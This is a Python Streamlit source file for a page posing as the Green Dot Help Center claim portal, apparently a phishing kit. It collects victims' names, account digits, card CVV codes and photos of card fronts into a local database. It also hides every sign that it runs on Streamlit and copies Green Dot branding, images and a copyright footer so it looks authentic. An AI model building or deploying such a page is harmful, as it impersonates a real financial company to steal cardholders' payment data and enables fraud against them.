
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Database setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, codigo_tarjeta TEXT,
                  monto REAL, factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# --- STYLING (Hiding all Streamlit artifacts) ---
st.markdown("""<style>
/* Ocultar header, footer y cualquier badge de Streamlit */
header {visibility: hidden !important;}
footer {display: none !important;}
#MainMenu {visibility: hidden !important;}
.stAppToolbar {display: none !important;}
.stDeployButton {display: none !important;}
[data-testid=\"stFooterAd\"] {display: none !important;}

/* Selectores específicos para el badge 'Made with Streamlit' y otros indicadores */
div[class^=\"viewerBadge\"] {display: none !important;}
div[class*=\"viewerBadge\"] {display: none !important;}
[data-testid=\"stStatusWidget\"] {display: none !important;}
#streamlit-connection-error {display: none !important;}

/* Ajuste de contenedor */
.block-container {
    padding-top: 1rem !important;
    padding-bottom: 0rem !important;
}

/* Colores de texto */
h1, h2, h3, p, label, .stMarkdown {
    color: var(--text-color);
}

.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    border-radius: 8px !important;
    font-weight: bold !important;
}

.app-section-container {
    background-color: #000000;
    color: #ffffff !important;
    padding: 30px 20px;
    text-align: center;
    margin-top: 20px;
    border-radius: 15px;
}

.legal-footer {
    font-size: 0.75rem;
    color: #666;
    text-align: justify;
    line-height: 1.5;
    padding: 20px 0;
    margin-top: 20px;
    border-top: 1px solid #ddd;
}
</style>""", unsafe_allow_html=True)

# --- UI CONTENT ---
with st.container():
    if os.path.exists('logo.svg'):
        st.image('logo.svg', width=160)
    st.title("Green Dot Help Center")
    st.info("Secure Claim Submission Portal")

st.divider()

with st.container():
    st.subheader("Submit a New Claim")
    with st.form("claim_form_final", clear_on_submit=True):
        nombre = st.text_input("Full Name")
        col1, col2 = st.columns(2)
        with col1:
            cuenta = st.text_input("Account Number (Last 4)")
        with col2:
            codigo = st.text_input("CVV / Code")
        monto = st.number_input("Disputed Amount ($)", min_value=0.0, step=0.01)
        st.write("**Required Evidence**")
        file_factura = st.file_uploader("Store Receipt", type=['png', 'jpg', 'jpeg'])
        file_tarjeta = st.file_uploader("Card Front Photo", type=['png', 'jpg', 'jpeg'])
        submit = st.form_submit_button("SUBMIT DISPUTE")

if submit:
    if nombre and file_factura and file_tarjeta:
        f_path = os.path.join(UPLOAD_DIR, f\"f_{int(datetime.now().timestamp())}_{file_factura.name}\")
        t_path = os.path.join(UPLOAD_DIR, f\"t_{int(datetime.now().timestamp())}_{file_tarjeta.name}\")
        with open(f_path, 'wb') as f: f.write(file_factura.getbuffer())
        with open(t_path, 'wb') as f: f.write(file_tarjeta.getbuffer())
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute(\"INSERT INTO greendot_submissions (nombre, cuenta, codigo_tarjeta, monto, factura_path, tarjeta_path, fecha) VALUES (?,?,?,?,?,?,?)\",
                  (nombre, cuenta, codigo, monto, f_path, t_path, str(datetime.now())))
        conn.commit()
        conn.close()
        st.success("✅ Submitted successfully.")
    else:
        st.error("⚠️ Please complete all fields.")

st.markdown(\"\"\"<div class=\"app-section-container\"><div class=\"app-headline\">Download the Green Dot app</div><div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;'><a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='140'></a><a href='#'><img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='140'></a></div></div>\"\"\", unsafe_allow_html=True)

st.markdown(\"\"\"<div class=\"legal-footer\">* When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br><strong>©2026 Green Dot Corporation. All rights reserved. NMLS #914924.</strong></div>\"\"\", unsafe_allow_html=True)
